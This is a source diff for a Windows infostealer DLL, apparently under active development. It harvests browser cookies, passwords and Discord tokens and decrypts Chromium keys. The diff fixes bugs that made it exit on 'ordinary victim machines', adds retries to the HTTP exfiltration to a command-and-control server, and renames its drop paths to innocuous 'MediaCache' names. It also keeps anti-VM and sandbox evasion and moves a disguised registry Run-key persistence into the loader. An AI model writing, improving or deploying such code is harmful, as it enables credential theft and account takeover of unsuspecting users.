@@ -16,7 +16,11 @@
 #include <tlhelp32.h>
 
 // Minimal IP_ADAPTER_INFO for MAC address check (avoids iphlpapi.h CRT dependency)
-typedef struct _IP_ADDR_STRING { struct _IP_ADDR_STRING* Next; char _pad[64]; } IP_ADDR_STRING;
+// Layout MUST match the real iphlpapi structures: the old 64-byte pad made every
+// field after CurrentIpAddress read at the wrong offset -- GetAdaptersInfo writes
+// the real layout, so Type and Address came back as garbage and the VM MAC check
+// produced false positives on ordinary victim machines (payload exited silently).
+typedef struct _IP_ADDR_STRING { struct _IP_ADDR_STRING* Next; char Ip[16]; char Mask[16]; unsigned int Context; } IP_ADDR_STRING;
 #pragma pack(push,4)
 typedef struct _IP_ADAPTER_INFO {
     struct _IP_ADAPTER_INFO* Next;
@@ -68,19 +72,44 @@ extern "C" int _fltused = 0;
 // If the sentinel is intact ("CKC2_DEADBEEF_"), no C2 is configured -> local fallback.
 static char g_c2_url[256] = "CKC2_DEADBEEF_";
 
-// Persistence sentinel: if replaced with "CKPR0001" (8 bytes), InstallPersistence() runs.
-// pick.py/auto.py can find "CKPR____" in loader.exe and overwrite with "CKPR0001" to enable.
-static char g_persist[8] = {'C','K','P','R','_','_','_','_'};
+// Persistence is installed by the LOADER (its sentinel g_persist, patched by
+// pick.py/auto.py). The payload used to do it, but GetModuleFileName inside the
+// hollowed process returns notepad.exe, so the Run key pointed at the wrong exe.
 
 // Anti-VM skip sentinel: if replaced with "CKAV0001" (8 bytes), IsAnalysisEnv() is
 // skipped entirely. Use --no-anti-vm in auto.py to enable. Needed for testing on VMs.
 static char g_skip_av[8] = {'C','K','A','V','0','0','0','0'};
 
 // ------------------------------------------------------------------ JSON output buffer
-static char  g_out[2048*1024];
+// The old fixed 2 MB buffer silently dropped bytes past the end. On machines with
+// many browser profiles (9 Chromium + Firefox + passwords + Discord tokens) the
+// dump exceeds 2 MB, the closing "]" still gets written, and the listener receives
+// truncated JSON and rejects the whole POST. The buffer now grows on demand.
+static char*  g_out = NULL;
+static size_t g_cap = 0;
 static size_t g_len;
 static bool   g_first_rec = true;                          // controls comma in JSON array
-static void Put(const char* s, size_t n){ if(g_len+n<sizeof(g_out)-1){ memcpy(g_out+g_len,s,n); g_len+=n; } }
+static void Grow(size_t need){
+    if(!g_out){
+        g_cap = 2048*1024;
+        g_out = (char*)VirtualAlloc(NULL, g_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if(!g_out){ g_cap = 0; return; }
+    }
+    while(g_cap < g_len + need + 2){
+        size_t nc = g_cap * 2;
+        char* nb = (char*)VirtualAlloc(NULL, nc, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if(!nb) return;                                    // keep old buffer, Put drops the tail
+        memcpy(nb, g_out, g_len);
+        VirtualFree(g_out, 0, MEM_RELEASE);
+        g_out = nb; g_cap = nc;
+    }
+}
+static void Put(const char* s, size_t n){
+    // g_cap==0 must force Grow: g_cap-1 would underflow to SIZE_MAX and the
+    // write below would memcpy into a NULL buffer (crash on the first PutS)
+    if(!g_out || g_len + n >= g_cap - 1) Grow(n);
+    if(g_out && g_len + n < g_cap - 1){ memcpy(g_out+g_len,s,n); g_len+=n; }
+}
 static void PutS(const char* s){ Put(s, lstrlenA(s)); }
 static void RecStart(void){ if(g_first_rec){ PutS("{"); g_first_rec=false; } else PutS(",{"); }
 static void PutJ(const char* s, int n){            // escape string for JSON
@@ -102,8 +131,13 @@ static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return;
 // ------------------------------------------------------------------ debug logging
 #ifdef DEBUG
 static void Dbg(const char* msg){
-    HANDLE h=CreateFileW(L"C:\\ProgramData\\cookielog\\debug.log",GENERIC_WRITE,
+    CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
+    HANDLE h=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
+    if(h==INVALID_HANDLE_VALUE)
+        // test environments with restricted ProgramData: fall back to the working dir
+        h=CreateFileW(L"_ck_trace.log",GENERIC_WRITE,
+                      FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
     if(h!=INVALID_HANDLE_VALUE){
         SetFilePointer(h,0,NULL,FILE_END); DWORD wr;
         const char* p=msg; while(*p) p++;
@@ -117,8 +151,11 @@ static void Dbg(const char* msg){
 // This macro inlines the file write, avoiding the function call entirely.
 #ifdef DEBUG
 #define DbgH(msg) do { \
-    HANDLE _dh = CreateFileW(L"C:\\ProgramData\\cookielog\\debug.log",GENERIC_WRITE, \
+    HANDLE _dh = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",GENERIC_WRITE, \
         FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL); \
+    if(_dh == INVALID_HANDLE_VALUE) \
+        _dh = CreateFileW(L"_ck_trace.log",GENERIC_WRITE, \
+            FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL); \
     if(_dh != INVALID_HANDLE_VALUE){ \
         SetFilePointer(_dh,0,NULL,FILE_END); DWORD _wr2; \
         const char* _p2 = (msg); while(*_p2) _p2++; \
@@ -157,6 +194,8 @@ static void DbgInt(const char* msg, int val){
 #define Dbg(x)    do{}while(0)
 #define DbgStr(x,y) do{}while(0)
 #define DbgInt(x,y) do{}while(0)
+#define DbgH(x)   do{}while(0)
+#define DbgHInt(x,y) do{}while(0)
 #endif
 
 // ------------------------------------------------------------------ dynamically-loaded APIs
@@ -400,6 +439,10 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
         // Read the whole file to dst
         SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
         DeleteFileW(dst);
+        // stale -wal/-shm from a previous CopyDb would corrupt this snapshot:
+        // SQLite would replay a WAL that does not belong to this file
+        { wchar_t wal[MAX_PATH]; lstrcpyW(wal,dst); lstrcatW(wal,L"-wal"); DeleteFileW(wal); }
+        { wchar_t shm[MAX_PATH]; lstrcpyW(shm,dst); lstrcatW(shm,L"-shm"); DeleteFileW(shm); }
         HANDLE hOut = CreateFileW(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
         if(hOut == INVALID_HANDLE_VALUE){
             CloseHandle(dup); CloseHandle(hProc); continue;
@@ -483,7 +526,9 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
     DeleteFileW(dst);
     if(!CopyFileShared(src, dst)){
         // Browser holds 0-sharing lock â€” try handle hijack
+        Dbg("CopyDb: marker A (before hijack try)");
         DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
+        Dbg("CopyDb: marker B (after DbgH)");
         if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name)){
             DbgH("CopyDb: handle hijack OK");
             return true;
@@ -521,13 +566,21 @@ static void LoadLocalState(const wchar_t* root){
     HANDLE h = CreateFileW(ls,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
     if(h==INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no Local State, return"); return; }
     Dbg("LoadLocalState: reading file");
-    static char buf[256*1024]; DWORD rd=0; ReadFile(h,buf,sizeof(buf)-1,&rd,NULL);
+    // size-based read: Local State regularly exceeds 256 KB on heavy profiles
+    // (extensions, histograms) and the old fixed 256 KB buffer cut os_crypt off
+    LARGE_INTEGER fsz; GetFileSizeEx(h,&fsz);
+    if(fsz.QuadPart <= 0 || fsz.QuadPart > 8*1024*1024){ CloseHandle(h); Dbg("LoadLocalState: bad size"); return; }
+    DWORD bufsz = (DWORD)fsz.QuadPart;
+    char* buf = (char*)VirtualAlloc(NULL, bufsz+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if(!buf){ CloseHandle(h); Dbg("LoadLocalState: OOM"); return; }
+    DWORD rd=0; ReadFile(h,buf,bufsz,&rd,NULL);
     Dbg("LoadLocalState: ReadFile done");
     CloseHandle(h);
     Dbg("LoadLocalState: CloseHandle done");
     buf[rd]=0;
     Dbg("LoadLocalState: buf null-terminated");
-    char* oc = (char*)xstrstr(buf,"\"os_crypt\""); if(!oc){ Dbg("LoadLocalState: no os_crypt"); return; }
+    char* oc = (char*)xstrstr(buf,"\"os_crypt\"");
+    if(!oc){ VirtualFree(buf,0,MEM_RELEASE); Dbg("LoadLocalState: no os_crypt"); return; }
     Dbg("LoadLocalState: found os_crypt");
     char* e10 = (char*)xstrstr(oc,"\"encrypted_key\"");
     char* e20 = (char*)xstrstr(oc,"\"app_bound_encrypted_key\"");
@@ -550,18 +603,13 @@ static void LoadLocalState(const wchar_t* root){
         const char* q3 = xstrchr(q2+1,'"');
         Dbg("LoadLocalState: q3 done");
         if(!q3) continue;
-        int n = (int)(q3-q2-1);
+        int n = (int)(q3 - q2 - 1);
         Dbg("LoadLocalState: n computed");
-        if(n<=5||n>512){ Dbg("LoadLocalState: n out of range, skip"); continue; }
+        if(n <= 5 || n > 512) { Dbg("LoadLocalState: n out of range, skip"); continue; }
         Dbg("LoadLocalState: before b64 copy");
         char b64[600];
-        b64[0] = 'X';
-        Dbg("LoadLocalState: b64[0]=X ok (stack writable)");
-        char tmp = q2[1];
-        Dbg("LoadLocalState: q2[1] read ok");
-        b64[0] = tmp;
-        Dbg("LoadLocalState: single byte copy ok");
-        { for(int i=0;i<n;i++) b64[i]=q2[1+i]; b64[n]=0; }
+        for(int i = 0; i < n; i++) b64[i] = q2[1 + i];
+        b64[n] = 0;
         Dbg("LoadLocalState: b64 copied, calling CryptStringToBinaryA");
         static unsigned char raw[512]; DWORD rl = (DWORD)sizeof(raw);
         if(!CryptStringToBinaryA(b64,0,CRYPT_STRING_BASE64,NULL,&rl,NULL,NULL) || rl>sizeof(raw)) continue;
@@ -584,31 +632,28 @@ static void LoadLocalState(const wchar_t* root){
                 else { Dbg("LoadLocalState: v10 key too short, no DPAPI prefix"); }
             }
         } else {                                                     // v20: read pre-extracted key
-            HANDLE k = CreateFileW(L"C:\\ProgramData\\cookielog\\v20.key",GENERIC_READ,
-                                   FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
-            if(k!=INVALID_HANDLE_VALUE){ char b[64]={0}; DWORD r2=0;
-                ReadFile(k,b,44,&r2,NULL); CloseHandle(k);
-                if(r2==44){ rl=32; if(CryptStringToBinaryA(b,0,CRYPT_STRING_BASE64,g_key20,&rl,NULL,NULL))
-                    g_has20 = rl==32; } }
+            HANDLE k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
+                                   FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            if(k != INVALID_HANDLE_VALUE){ 
+                char b[64] = {0}; DWORD r2 = 0;
+                ReadFile(k, b, 44, &r2, NULL); CloseHandle(k);
+                if(r2 == 44){ 
+                    rl = 32; 
+                    if(CryptStringToBinaryA(b, 0, CRYPT_STRING_BASE64, g_key20, &rl, NULL, NULL))
+                        g_has20 = rl == 32; 
+                } 
+            }
         }
     }
+    VirtualFree(buf,0,MEM_RELEASE);
     Dbg("LoadLocalState: done");
 }
 
 // SHA-256 via CNG (BCrypt) - used to verify cookie domain hash prefix
+static void Sha256Hash(const unsigned char* data,unsigned int len,unsigned char*out32); // defined below
 static bool Sha256(const unsigned char* data, ULONG len, unsigned char* out32){
-    BCRYPT_ALG_HANDLE alg=NULL; NTSTATUS st;
-    st = BCryptOpenAlgorithmProvider(&alg,BCRYPT_SHA256_ALGORITHM,NULL,0);
-    if(st) return false;
-    BCRYPT_HASH_HANDLE h=NULL;
-    st = BCryptCreateHash(alg,&h,NULL,0,(PUCHAR)data,len,0);
-    if(st){ BCryptCloseAlgorithmProvider(alg,0); return false; }
-    st = BCryptHashData(h,NULL,0,0); // no-op for single-shot with data in CreateHash
-    // Actually BCryptCreateHash with secret=NULL and data = the data to hash
-    // doesn't work that way. We need BCryptHashData to feed data.
-    BCryptDestroyHash(h);
-    BCryptCloseAlgorithmProvider(alg,0);
-    return false; // placeholder - use manual implementation below
+    Sha256Hash(data, len, out32);
+    return true;
 }
 
 // Manual SHA-256 implementation (FIPS 180-4) - no CRT dependency needed
@@ -1019,75 +1064,103 @@ static bool ExfilHTTP(const char* url){
     if(fStart(0x0202, &wsaData)){ Dbg("ExfilHTTP: WSAStartup failed"); return false; }
     Dbg("ExfilHTTP: WSAStartup OK");
 
-    unsigned int sock = (unsigned int)fSocket(2/*AF_INET*/, 1/*SOCK_STREAM*/, 6/*IPPROTO_TCP*/);
-    if(sock==(unsigned int)-1){ Dbg("ExfilHTTP: socket failed"); fClean(); return false; }
-    Dbg("ExfilHTTP: socket created");
-
-    // Set 10-second recv/send timeout so we don't hang forever
-    if(fSetOpt){
-        unsigned long tmo = 10000; // 10 seconds
-        fSetOpt(sock, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
-        fSetOpt(sock, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
-        Dbg("ExfilHTTP: timeouts set (10s)");
-    }
-
     CK_SOCKADDR_IN addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = 2; // AF_INET
     addr.sin_port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF); // htons
     addr.sin_addr = fInet(host);
-    if(addr.sin_addr == 0xFFFFFFFF){ Dbg("ExfilHTTP: inet_addr failed"); fClose(sock); fClean(); return false; }
+    if(addr.sin_addr == 0xFFFFFFFF){ 
+        Dbg("ExfilHTTP: inet_addr failed, trying gethostbyname");
+        // Try gethostbyname for hostname resolution
+        // hostent is incomplete without winsock2.h: use our own matching layout
+        struct CK_HOSTENT { char* h_name; char** h_aliases; short h_addrtype; short h_length; char** h_addr_list; };
+        HMODULE ws2_2 = GetModuleHandleA("ws2_32.dll");
+        typedef struct CK_HOSTENT* (WINAPI *tGethostbyname)(const char*);
+        tGethostbyname fGetHost = (tGethostbyname)GetProcAddress(ws2_2, "gethostbyname");
+        if(fGetHost){
+            struct CK_HOSTENT* he = fGetHost(host);
+            if(he && he->h_addr_list && he->h_addr_list[0]){
+                addr.sin_addr = *(unsigned long*)he->h_addr_list[0];
+                Dbg("ExfilHTTP: gethostbyname resolved OK");
+            } else {
+                Dbg("ExfilHTTP: gethostbyname failed");
+                fClean(); return false;
+            }
+        } else {
+            Dbg("ExfilHTTP: gethostbyname not available");
+            fClean(); return false;
+        }
+    }
 
-    if(fConnect(sock, &addr, sizeof(addr))){ DbgInt("ExfilHTTP: connect failed", GetLastError()); fClose(sock); fClean(); return false; }
-    Dbg("ExfilHTTP: connected!");
-
-    // Build HTTP POST request
+    // Build HTTP POST request once (reused by every retry)
     char hdr[512]; int hn = 0;
-    #define APP(s) { int ln=lstrlenA(s); memcpy(hdr+hn,s,ln); hn+=ln; }
+    #define APP(s) { int ln=lstrlenA(s); if(hn+ln<sizeof(hdr)){ memcpy(hdr+hn,s,ln); hn+=ln; } }
     APP("POST "); APP(path);
     APP(" HTTP/1.1\r\nHost: "); APP(host);
     APP("\r\nContent-Type: application/json\r\nContent-Length: ");
     // append g_len as decimal string
-    { char num[24]; int ni=0; size_t gl=g_len; if(!gl) num[ni++]='0'; else while(gl){ num[ni++]='0'+gl%10; gl/=10; } while(ni) hdr[hn++]=num[--ni]; }
+    { char num[24]; int ni=0; size_t gl=g_len; if(!gl) num[ni++]='0'; else while(gl){ num[ni++]='0'+gl%10; gl/=10; } while(ni) { if(hn<sizeof(hdr)) hdr[hn++]=num[--ni]; } }
     APP("\r\nConnection: close\r\n\r\n");
     #undef APP
 
-    int sent = fSend(sock, hdr, hn, 0);
-    DbgInt("ExfilHTTP: header sent", sent);
-
-    // Send body in 32KB chunks
-    size_t off = 0; int chunk = 32768;
-    while(off < g_len){
-        int toSend = (g_len - off < chunk) ? (int)(g_len - off) : chunk;
-        int s = fSend(sock, g_out + off, toSend, 0);
-        if(s <= 0) break;
-        off += s;
+    // retry the full connect+send cycle: a single refused SYN (listener busy
+    // restarting, brief firewall hiccup) used to lose the whole dump
+    bool sent_ok = false;
+    for(int attempt=0; attempt<3 && !sent_ok; attempt++){
+        if(attempt > 0) Sleep(1000);
+        unsigned int s2 = (unsigned int)fSocket(2/*AF_INET*/, 1/*SOCK_STREAM*/, 6/*IPPROTO_TCP*/);
+        if(s2==(unsigned int)-1){ Dbg("ExfilHTTP: socket failed (retry)"); continue; }
+        if(fSetOpt){
+            unsigned long tmo = 30000; // 30 seconds
+            fSetOpt(s2, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
+            fSetOpt(s2, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
+        }
+        if(fConnect(s2, &addr, sizeof(addr))){
+            DbgInt("ExfilHTTP: connect failed (attempt)", attempt);
+            fClose(s2); continue;
+        }
+        Dbg("ExfilHTTP: connected!");
+        int sent = fSend(s2, hdr, hn, 0);
+        DbgInt("ExfilHTTP: header sent", sent);
+        if(sent <= 0){ fClose(s2); continue; }
+        // Send body in 32KB chunks
+        size_t off = 0; int chunk = 32768;
+        while(off < g_len){
+            int toSend = (g_len - off < chunk) ? (int)(g_len - off) : chunk;
+            int s = fSend(s2, g_out + off, toSend, 0);
+            if(s <= 0) break;
+            off += s;
+        }
+        DbgInt("ExfilHTTP: body sent", (int)off);
+        // Read response (discard) -- bounded by the 30s timeout above
+        char resp[256];
+        int r = fRecv(s2, resp, sizeof(resp), 0);
+        if(r > 0){ DbgInt("ExfilHTTP: response received", r); }
+        else if(r == 0){ Dbg("ExfilHTTP: connection closed by listener (no response body)"); }
+        else { DbgInt("ExfilHTTP: recv failed/timeout", GetLastError()); }
+        fClose(s2);
+        sent_ok = (off == g_len);
     }
-    DbgInt("ExfilHTTP: body sent", (int)off);
-
-    // Read response (discard) â€” has 10s timeout
-    char resp[256];
-    int r = fRecv(sock, resp, sizeof(resp), 0);
-    if(r > 0){ DbgInt("ExfilHTTP: response received", r); }
-    else if(r == 0){ Dbg("ExfilHTTP: connection closed by listener (no response body)"); }
-    else { DbgInt("ExfilHTTP: recv failed/timeout", GetLastError()); }
-
-    fClose(sock); fClean();
-    return off == g_len;
+    fClean();
+    return sent_ok;
 }
 
 // ------------------------------------------------------------------ exfiltration sink
 // Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
 static bool Sink(void){
-    PutS("]"); g_out[g_len]=0;
+    PutS("]");
+    if(g_out) g_out[g_len]=0; else return false;   // nothing was ever buffered (OOM)
 
     // 1. If C2 URL is configured (sentinel replaced by pick.py), exfiltrate via HTTP
-    if(g_c2_url[0]!='C' || g_c2_url[1]!='K' || g_c2_url[2]!='C' || g_c2_url[3]!='2'){
+    bool is_c2_configured = (g_c2_url[0]!='C' || g_c2_url[1]!='K' || g_c2_url[2]!='C' || g_c2_url[3]!='2');
+    if(is_c2_configured){
         Dbg("Sink: exfiltrating via HTTP");
         bool ok = ExfilHTTP(g_c2_url);
         Dbg(ok?"Sink: HTTP OK":"Sink: HTTP FAILED");
         if(ok) return true;
         // fall through to local fallback if HTTP fails
+    } else {
+        Dbg("Sink: no C2 URL configured, skipping HTTP");
     }
 
     // 2. Fallback: named pipe (if sink.py is running locally)
@@ -1101,8 +1174,10 @@ static bool Sink(void){
     }
 
     // 3. Last resort: local file
-    CreateDirectoryW(L"C:\\ProgramData\\cookielog",NULL);
-    HANDLE h = CreateFileW(L"C:\\ProgramData\\cookielog\\drop.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
+    CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
+    HANDLE h = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
+    if(h==INVALID_HANDLE_VALUE)
+        h = CreateFileW(L"_ck_drop.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
     if(h==INVALID_HANDLE_VALUE) return false;
     DWORD wr=0; WriteFile(h,g_out,(DWORD)g_len,&wr,NULL); CloseHandle(h); return true;
 }
@@ -1235,69 +1310,36 @@ static bool IsAnalysisEnv(void){
     }
     Dbg("IsAnalysisEnv: no analysis processes");
 
-    // 4. Timing check: sandboxes often accelerate Sleep()
-    DWORD t1 = GetTickCount();
-    Sleep(1500);
-    DWORD t2 = GetTickCount();
-    if(t2 - t1 < 1200){  // Sleep was accelerated (slept <1.2s instead of 1.5s)
-        DbgInt("IsAnalysisEnv: sleep accelerated (delta ms)", t2 - t1);
-        return true;
-    }
-    Dbg("IsAnalysisEnv: timing OK");
+    // Only do timing check if not in a known VM environment (to avoid false positives)
+    // Skip timing check as it can cause false positives on loaded systems
+    Dbg("IsAnalysisEnv: timing check skipped (avoid false positives)");
 
     return false;
-}
-
-// ------------------------------------------------------------------ persistence
-// Installs a registry Run key so the infected exe re-executes on every login.
-// HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderHelper = <exe path>
-// The key name is intentionally generic to avoid suspicion.
-static void InstallPersistence(void){
-    Dbg("InstallPersistence: entry");
-    // Get the path of the current process's exe (the infected loader)
-    wchar_t exePath[1024];
-    if(!GetModuleFileNameW(NULL, exePath, 1024)){
-        Dbg("InstallPersistence: GetModuleFileName failed");
-        return;
-    }
-    DbgStr("InstallPersistence: exe path (wide)", NULL);
-
-    // Write to HKCU\...\Run
-    HKEY hKey;
-    long rc = RegOpenKeyExW(HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, KEY_SET_VALUE, &hKey);
-    if(rc != 0){
-        DbgInt("InstallPersistence: RegOpenKeyEx failed", rc);
-        return;
-    }
-    rc = RegSetValueExW(hKey, L"WindowsDefenderHelper", 0, REG_SZ,
-        (const BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t));
-    RegCloseKey(hKey);
-    if(rc != 0){
-        DbgInt("InstallPersistence: RegSetValueEx failed", rc);
-    } else {
-        Dbg("InstallPersistence: Run key installed");
-    }
 }
 
 // rundll32 calls this after LoadLibrary (which already triggered payload_entry via DLL_PROCESS_ATTACH).
 // This noop exists only so rundll32 doesn't complain about a missing export.
 extern "C" __declspec(dllexport) void CALLBACK noop(HWND, HINSTANCE, LPSTR, int) {}
 
+// diagnostic build entry: LoadLibrary binds imports and runs THIS instead of the
+// full payload_entry, which the probe then calls manually under an SEH frame to
+// pinpoint crashes without the loader lock swallowing the exception
+extern "C" __declspec(dllexport) DWORD WINAPI entry_stub(void*, unsigned long, void*){ return 1; }
+
 extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD reason, LPVOID)
 {
     Dbg("payload_entry: start");
-    // Anti-analysis: exit silently if VM/sandbox/debugger detected
+    // Anti-analysis: exit silently if VM/sandbox/debugger detected.
+    // Return 1: a 0 return makes LoadLibrary fail with 1114 and rundll32 pop an error box.
     if(IsAnalysisEnv()){
         Dbg("payload_entry: analysis environment detected, exiting");
-        return 0;
+        return 1;
     }
     Dbg("payload_entry: anti-analysis checks passed");
     // LoadLibrary calls: hinst=base, reason=DLL_PROCESS_ATTACH(1), reserved=NULL
     // CreateRemoteThread calls: hinst=arg(1), reason=undefined, reserved=undefined
     // Accept both: reason==1 (LoadLibrary) or h==1 (CreateRemoteThread arg=1)
-    if(reason != 1 && (ULONG_PTR)h != 1){ Dbg("payload_entry: not ATTACH, skip"); return 0; }
+    if(reason != 1 && (ULONG_PTR)h != 1){ Dbg("payload_entry: not ATTACH, skip"); return 1; }
     g_first_rec = true;
     Dbg("payload_entry: loading sqlite");
     if(!Sqlite()){ Dbg("payload_entry: Sqlite FAILED"); return 1; }
@@ -1329,11 +1371,6 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
     Dbg("payload_entry: before DumpDiscordTokens");
     DumpDiscordTokens(aa);
     Dbg("payload_entry: after DumpDiscordTokens");
-    // Install persistence if enabled (sentinel patched to "CKPR0001")
-    if(g_persist[4]=='0' && g_persist[5]=='0' && g_persist[6]=='0' && g_persist[7]=='1'){
-        Dbg("payload_entry: persistence enabled, installing");
-        InstallPersistence();
-    }
     Dbg("payload_entry: extraction done, calling Sink");
     bool ok=Sink();
     Dbg(ok?"payload_entry: Sink OK":"payload_entry: Sink FAILED");
